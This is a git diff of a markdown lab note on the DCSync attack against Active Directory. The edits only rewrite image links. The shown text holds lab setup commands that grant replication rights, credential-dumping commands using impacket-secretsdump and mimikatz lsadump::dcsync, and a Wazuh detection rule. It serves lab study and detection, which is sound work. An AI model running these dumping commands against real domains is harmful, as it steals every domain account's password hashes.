@@ -2,7 +2,8 @@ DCSync abuses the "Directory Replication Service (DRS)" protocol. Domain Control
 
 ***Lab Setup***
 
-GUI:`Win + r -> dsa.msc` Create a new user, Enable Advanced Features `View -> Tick Advanced Features` `Right-Click FQDN -> Properties -> Security -> Advanced -> Add -> Select a Principal` Enter Desired User ![[Active Directory/DCSync/screenshots/dsa.msc.png]]![[Adding Replication Rights GUI.png]]
+GUI:`Win + r -> dsa.msc` Create a new user, Enable Advanced Features `View -> Tick Advanced Features` `Right-Click FQDN -> Properties -> Security -> Advanced -> Add -> Select a Principal` Enter Desired User ![Description](Screenshots/dsa.msc.png)
+![Description](Adding%20Replication%20Rights%20GUI.png)
 
 CLI: Run Powershell as administrator.
 
@@ -14,24 +15,24 @@ Grant The Permissions: `dsacls.exe "DC=redteam,DC=local" /G "redteam.local\dcrep
 
 Verify: `(Get-Acl AD:\DC=redteam,DC=local).Access | Where-Object {$_.IdentityReference -eq "REDTEAM\dcreplicate"} | Select-Object ActiveDirectoryRights, IdentityReference | fl`
 
-![[Windows CLI Add priv.png]]
+![Description](Windows%20CLI%20Add%20priv.png)
 
 
 **Attack**
 
 From Linux: `impacket-secretsdump redteam.local/dcreplicate:"Password123"@$IP`
 
-![[Active Directory/DCSync/Screenshots/dsa.msc.png]]
+![Description](Screenshots/dsa.msc.png)
 
 From Windows: `.\mimikatz.exe`
 `lsadump::dcsync /domain redteam.local /user:$USER$`
-![[Windows powershell mimikatz.png]]
+![Description](Windows%20powershell%20mimikatz.png)
 
 Detection: Custom Wazuh Rule
 ```xml
 <rule id="100012" level="15"> <if_sid>60103</if_sid> <field name="win.system.eventID">^4662$</field> <field name="win.eventdata.properties">1131f6aa-9c07-11d1-f79f-00c04fc2dcd2</field> <description>DCSync detected - Replicating Directory Changes permission used by $(win.eventdata.subjectUserName)</description> <mitre> <id>T1003.006</id> </mitre> </rule>
 ```
-![[Active Directory/DCSync/screenshots/Wazuh Detection.png]]
+![Description](Screenshots/Wazuh%20Detection.png)
 
 | Wazuh Rule               | Value                                | Meaning                        |
 | ------------------------ | ------------------------------------ | ------------------------------ |
